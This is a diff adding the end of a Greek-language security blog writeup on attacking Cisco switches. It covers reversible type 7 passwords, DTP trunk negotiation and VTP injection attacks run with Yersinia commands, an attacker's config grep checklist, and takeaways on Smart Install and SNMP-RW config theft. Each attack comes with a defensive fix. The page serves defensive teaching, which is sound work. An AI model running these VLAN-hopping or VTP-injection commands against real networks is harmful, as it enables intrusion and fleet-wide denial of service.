+    <p>Αυτή η εντολή εφαρμόζει μόνο <strong>type 7</strong> σε plaintext κωδικούς στο config — το αναστρέψιμο είδος. Σταματά κάποιον που κοιτάζει πάνω από τον ώμο σου, τίποτα παραπάνω· όποιος έχει το config έχει το cleartext σε μία εντολή. Δεν είναι υποκατάστατο πραγματικού hashing. Χρησιμοποίησε <code>enable secret</code> (ποτέ <code>enable password</code>), και προτίμησε <strong>type 8 ή 9</strong> για τοπικούς χρήστες: <code>username admin algorithm-type scrypt secret &lt;pw&gt;</code>. Αυτές είναι οι δύο γραμμές που στενάζει ένας επιτιθέμενος.</p>
+  </div>
+
+  <!-- 05 -->
+  <p class="section-num">05</p>
+  <h2 class="section-title">Layer 2 — DTP &amp; VTP, τα Δικα του Οπλα του Switch</h2>
+  <p class="section-thesis"><em>Δεν χρειάζεσαι πάντα το config. Αν ένα access port διαπραγματευτεί trunk, παίρνεις κάθε VLAN. Το Dynamic Trunking Protocol (DTP) είναι on by default σε πολλά ports, και είναι επίθεση ενός εργαλείου.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Επιτιθεμενος — διαπραγματευσου trunk, μετα φτασε καθε VLAN</span>
+    <pre class="term"><span class="cmt"># Αν το port είναι 'dynamic auto/desirable', το DTP θα κάνει trunk μαζί μας ευχαρίστως.
+# Το Yersinia πλαστογραφεί DTP για να γυρίσει το port σε trunk.</span>
+<span class="pc">$</span> <span class="out">yersinia dtp -attack 1 -interface eth0</span>
+<span class="out">  [+] Enabling trunking on the attached port ...</span>
+
+<span class="cmt"># Τώρα δημιούργησε ένα subinterface ανά VLAN που είδαμε στο CDP και είμαστε σε όλα.</span>
+<span class="pc">$</span> <span class="out">vconfig add eth0 20 && ip addr add 10.20.0.66/24 dev eth0.20</span>
+<span class="pc">$</span> <span class="out">ip link set eth0.20 up && ping 10.20.0.1</span>   <span class="cmt"># VLAN 20 gateway — προσβασιμο</span>
+
+<span class="cmt"># VTP: αν το domain δεν έχει authentication, κάνε inject μια διαφήμιση
+# υψηλότερου revision για να ξαναγράψεις/καθαρίσεις τη βάση VLAN σε όλο το fleet (DoS).</span>
+<span class="pc">$</span> <span class="out">yersinia vtp -attack 0 -interface eth0</span></pre>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ Η Διορθωση — Κλειδωσε τα Access Ports</span>
+    <p>Σε κάθε user/access port: <code>switchport mode access</code> και <code>switchport nonegotiate</code> ώστε το DTP να μην μπορεί ποτέ να διαπραγματευτεί trunk. Βάλε ένα αχρησιμοποίητο, tagged native VLAN στα πραγματικά trunks (σκοτώνει και το double-tagging), και είτε τρέξε VTP <em>transparent</em> είτε βάλε VTP password ώστε οι injected διαφημίσεις να απορρίπτονται. Αυτό είναι ο πυρήνας του <a href="cisco-switch-security.html">Ασφαλεια Switch</a> — οι επιθέσεις DTP/VTP υπάρχουν ακριβώς επειδή τα defaults είναι «διαπραγματεύσου ελεύθερα».</p>
+  </div>
+
+  <!-- 06 -->
+  <p class="section-num">06</p>
+  <h2 class="section-title">Το Checklist Config του Επιτιθεμενου</h2>
+  <p class="section-thesis"><em>Όταν παίρνω ένα running-config σε ένα engagement, αυτό είναι το πέρασμα grep — οι γραμμές που γίνονται findings. Τρέξ' το πρώτα πάνω στα δικά σου configs.</em></p>
+
+  <table class="cheat">
+    <thead><tr><th>Ψαξε για</th><th>Γιατι ειναι finding</th></tr></thead>
+    <tbody>
+      <tr><td>απουσία no vstack</td><td>Smart Install εκτεθειμένο — κλοπή config χωρίς auth (§02)</td></tr>
+      <tr><td>snmp-server community</td><td>v1/v2c community· RW = πλήρης συμβιβασμός (§03)</td></tr>
+      <tr><td>enable password / password 7</td><td>Αναστρέψιμο ή αδύναμο· ισοδύναμο με cleartext (§04)</td></tr>
+      <tr><td>secret 5 / secret 4</td><td>Crackable/deprecated hashes — πέρνα σε 8/9 (§04)</td></tr>
+      <tr><td>switchport mode dynamic</td><td>Διαπραγμάτευση trunk μέσω DTP → VLAN hopping (§05)</td></tr>
+      <tr><td>no transport input / telnet</td><td>Cleartext management· sniffable creds — μόνο SSH</td></tr>
+      <tr><td>cdp run στο edge</td><td>Δωρεάν recon σε οποιοδήποτε user port (§01)</td></tr>
+      <tr><td>vtp mode server + χωρίς password</td><td>Injection στη βάση VLAN / DoS σε όλο το fleet (§05)</td></tr>
+    </tbody>
+  </table>
+
+  <!-- TAKEAWAYS -->
+  <div class="takeaways">
+    <p class="takeaways-title">Συμπερασματα</p>
+    <ol>
+      <li><strong>Μαζεύεις τα Cisco boxes, δεν τα κάνεις exploit.</strong> Η επιφάνεια επίθεσης είναι κατάλοιπα defaults — management protocols που κανείς δεν απενεργοποίησε, όχι zero-days.</li>
+      <li><strong>Το recon είναι δωρεάν.</strong> Το CDP δίνει μοντέλο/έκδοση/mgmt-IP/VLAN σε κάθε access port· το SNMP με μαντεμένο community κάνει fingerprint τα υπόλοιπα. <code>no cdp run</code> στο edge, μόνο SNMPv3.</li>
+      <li><strong>Το Smart Install είναι ο στόχος με τη μεγαλύτερη αξία.</strong> TCP 4786 χωρίς <code>vstack</code> config = κλοπή running-config χωρίς auth. Το <code>no vstack</code> το κλείνει σε μία γραμμή.</li>
+      <li><strong>Το SNMP-RW είναι ένα API αντιγραφής config.</strong> Μία ακολουθία <code>snmpset</code> στέλνει το config μέσω TFTP στον επιτιθέμενο. Σκότωσε v2c και κάθε RW community.</li>
+      <li><strong>Μάθε τους τύπους κωδικών.</strong> Το type 7 είναι στιγμιαίο, το type 5 σπάει γρήγορα, τα types 8/9 αντιστέκονται. Το <code>service password-encryption</code> δεν προστατεύει τίποτα ουσιαστικό.</li>
+      <li><strong>Το Layer 2 είναι ένας δρόμος μέσα.</strong> Το DTP διαπραγματεύεται trunks από access ports· το VTP ξαναγράφει βάσεις VLAN. <code>switchport mode access</code> + <code>nonegotiate</code> και ένα VTP password κλείνουν και τα δύο.</li>
+      <li><strong>Κάθε επίθεση εδώ έχει διόρθωση μιας γραμμής</strong> που ήδη καλύπτεται στα αμυντικά posts. Το offense είναι απλώς το επιχείρημα για το γιατί τα τρέχεις.</li>
+    </ol>
+  </div>
+
+  <div class="cta-card">
+    <h3>Θελεις να μαθεις τι δινουν τα switches σου προτου το μαθει καποιος αλλος;</h3>
+    <p>Τρέχω εξουσιοδοτημένα penetration tests και configuration audits σε Cisco και MikroTik estates &mdash; Smart Install, SNMP strings, αδύναμα credentials, έκθεση Layer-2 &mdash; και παραδίδω ακριβώς ό,τι θα είχε βρει πρώτος ένας επιτιθέμενος.</p>
+    <a class="cta-btn" href="https://s-markakis.github.io/services.html">Κλεισε μια Discovery Call →</a>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 S. Markakis</span>
+  <a href="https://s-markakis.github.io/blog.html">← Όλα τα writeups</a>
+</footer>
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
